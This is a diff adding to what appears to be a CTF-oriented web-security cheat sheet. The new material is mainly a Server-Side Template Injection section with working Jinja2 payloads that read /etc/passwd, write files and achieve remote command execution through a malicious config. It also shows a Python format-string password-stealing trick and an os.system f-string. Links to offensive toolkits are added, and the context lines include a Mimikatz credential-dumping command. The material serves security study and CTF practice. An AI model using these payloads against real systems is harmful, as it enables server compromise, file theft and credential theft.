@@ -835,6 +835,58 @@ HQL injection example (pwn2win 2017)
 - Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
 
 
+# SSTI 
+
+Server-Side Template Injection
+
+- Testing
+    - ` {{ 7*'7' }}`
+        - Twig: `49`
+        - Jinja2: `7777777`
+    - `<%= 7*7 %>`
+        - Ruby ERB: `49`
+
+- Flask/Jinja2
+    - Dump all used classes
+        - `{{ ''.__class__.__mro__[2].__subclasses__() }}
+`
+    - Read File
+        - `{{}}''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
+    - Write File
+        - `{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}`
+    - RCE
+        - `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
+            - evil config
+        - `{{ config.from_pyfile('/tmp/evilconfig.cfg') }}`
+            - load config
+        - `{{ config['RUNCMD']('cat flag',shell=True) }}`
+
+
+- Python
+    - `%`
+        - 輸入`%(passowrd)s`即可偷到密碼：
+        ```python
+        userdata = {"user" : "kaibro", "password" : "ggininder" }
+        passwd  = raw_input("Password: ")
+        if passwd != userdata["password"]:
+            print ("Password " + passwd + " is wrong") %     userdata
+        ```
+    - `f`
+        - python 3.6
+        - example
+            - `a="gg"`
+            - `b=f"{a} ininder"`
+                - `>>> gg ininder`
+        - example2
+            - `f"{os.system('ls')}"`
+
+- Tool
+    - https://github.com/epinna/tplmap
+
+---
+
+http://blog.portswigger.net/2015/08/server-side-template-injection.html
+
 # SSRF
 
 ## Bypass 127.0.0.1 
@@ -975,6 +1027,10 @@ SSH-2.0-libssh2_1.4.2
     - syslog
 
 ---
+
+SSRF Bible
+
+https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit
 
 https://github.com/cujanovic/SSRF-Testing
 
@@ -1128,6 +1184,8 @@ xxe.dtd:
 
 - https://github.com/drwetter/testssl.sh
 
+- https://github.com/urbanadventurer/WhatWeb
+
 ## Social Enginerring
 
 - https://leakedsource.ru/
@@ -1165,6 +1223,10 @@ xxe.dtd:
 - PHP混淆 / 加密
     - http://enphp.djunny.com/
     - http://www.phpjm.net/
+
+- https://github.com/PowerShellMafia/PowerSploit
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/
 
 - Mimikatz
     - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
